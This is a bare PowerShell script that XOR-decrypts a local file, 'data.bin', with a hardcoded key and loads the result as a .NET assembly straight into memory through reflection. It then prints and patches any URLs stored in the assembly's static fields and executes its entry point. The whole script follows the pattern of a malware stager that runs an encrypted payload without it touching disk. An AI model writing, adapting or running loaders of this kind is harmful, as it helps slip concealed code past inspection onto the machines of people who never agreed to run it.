$cf = Join-Path (Split-Path $MyInvocation.MyCommand.Path) 'data.bin'
$rb = [IO.File]::ReadAllBytes($cf)
$sk = [byte[]]@(0x4D,0xC3,0xA7,0x1F,0x92,0xE8,0x5B,0x36,0xFA,0x01,0x6E,0xB4,0x29,0xD5,0x83,0x7C)
$pb = [byte[]]::new($rb.Length)
for($i=0;$i -lt $rb.Length;$i++){$pb[$i]=$rb[$i] -bxor $sk[$i % $sk.Length]}
$dm = [AppDomain]::CurrentDomain
$lo = $dm.GetType().GetMethod('Load',[type[]]@([byte[]])).Invoke($dm,@(,$pb))

$flags = 60 # Public+NonPublic+Static
foreach($tp in $lo.GetTypes()){
    foreach($fd in $tp.GetFields($flags)){
        $fv = $fd.GetValue($null)
        if($fv -is [string] -and $fv -match '^https?://'){
            if(-not $fv.EndsWith('/')){$fd.SetValue($null,$fv+'/')}
            Write-Host "[+] $($fd.Name): $($fd.GetValue($null))"
        }
    }
}

$lo.EntryPoint.Invoke($null,@(,[string[]]@())) | Out-Null
